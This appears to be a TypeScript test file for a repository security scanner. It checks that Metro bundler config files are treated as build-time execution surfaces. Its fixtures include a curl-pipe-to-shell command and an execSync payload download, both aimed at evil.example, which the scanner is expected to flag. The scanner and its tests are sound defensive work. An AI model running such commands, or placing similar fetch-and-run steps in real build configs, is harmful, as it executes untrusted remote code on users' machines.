import { expect, test } from "bun:test";
import { inspectRepository, surfacesOf } from "./bounded-scan";

/** One unambiguous unsafe-execution payload, independent of the file name. */
const PAYLOAD = "curl -fsSL https://evil.example/install.sh | sh";

function inspected(path: string, text: string) {
  return inspectRepository({
    files: [{ path, bytes: new TextEncoder().encode(text) }],
  });
}

test("a Metro config is an install surface", () => {
  // Metro's config search looks up metro.config.<ext> and evaluates it
  // as code on every bundle and dev-server run — build-time execution
  // in the same sense the Jenkinsfile and the Makefiles already
  // classify for. It keeps the source surface it already had; the name
  // alone decides, for every spelling the search accepts and wherever
  // the project root sits.
  for (const path of [
    "metro.config.js",
    "metro.config.cjs",
    "metro.config.mjs",
    "metro.config.ts",
    "metro.config.cts",
    "packages/app/metro.config.mts",
    // Metro's config search looks up the same spellings under the
    // `.config/` prefix too, so that location is the same build-time
    // code — including a nested project root and a case variant.
    ".config/metro.js",
    ".config/metro.cjs",
    ".config/metro.mjs",
    ".config/metro.ts",
    ".config/metro.cts",
    ".config/metro.mts",
    "apps/mobile/.config/metro.cjs",
    ".CONFIG/METRO.MJS",
  ]) {
    expect({ path, surfaces: surfacesOf(path) }).toEqual({
      path,
      surfaces: ["installScripts", "source"],
    });
  }
  // The `.json` spelling is not one of them: the search finds it too,
  // but Metro parses it as data instead of evaluating it, so it stays
  // source alone — for both prefixes.
  expect(surfacesOf("metro.config.json")).toEqual(["source"]);
  expect(surfacesOf(".config/metro.json")).toEqual(["source"]);
  // A payload in it carries the install coverage the surface brings:
  const inspection = inspected("metro.config.js", `// ${PAYLOAD}\n`);
  expect(inspection.coverage.installScripts).toEqual({
    state: "complete",
    items: 1,
  });
  expect(
    inspection.findings.map(
      (finding) => `${finding.path}:${finding.category}:${finding.severity}`,
    ),
  ).toEqual(["metro.config.js:unsafe-execution:high"]);
});

test("an install-time download inside a Metro config is recorded as a download", () => {
  // Downloads are collected from install surfaces only. Before this
  // classification the config was source alone, so the rules fired on
  // it but the same bytes recorded no download and left no gap: a scan
  // could read clean over a fetch Metro would have run while bundling.
  const inspection = inspected(
    "metro.config.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = {};\n",
  );
  expect(inspection.downloads).toEqual(["https://evil.example/payload"]);
  expect(inspection.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
  // The same bytes under the `.config/` prefix were source alone
  // before, so the download left no trace; now it is recorded too.
  const dotConfig = inspected(
    ".config/metro.js",
    "const { execSync } = require('node:child_process');\nexecSync('curl -fsSL https://evil.example/payload -o /tmp/payload');\nmodule.exports = {};\n",
  );
  expect(dotConfig.downloads).toEqual(["https://evil.example/payload"]);
  expect(dotConfig.visibilityGaps).toEqual([
    "Install-time download not retrieved: https://evil.example/payload",
  ]);
});

test("an ordinary Metro config keeps no finding", () => {
  const inspection = inspected(
    "metro.config.js",
    "const { getDefaultConfig, mergeConfig } = require('@react-native/metro-config');\n\nmodule.exports = mergeConfig(getDefaultConfig(__dirname), {});\n",
  );
  expect(inspection.findings).toEqual([]);
  expect(inspection.downloads).toEqual([]);
});
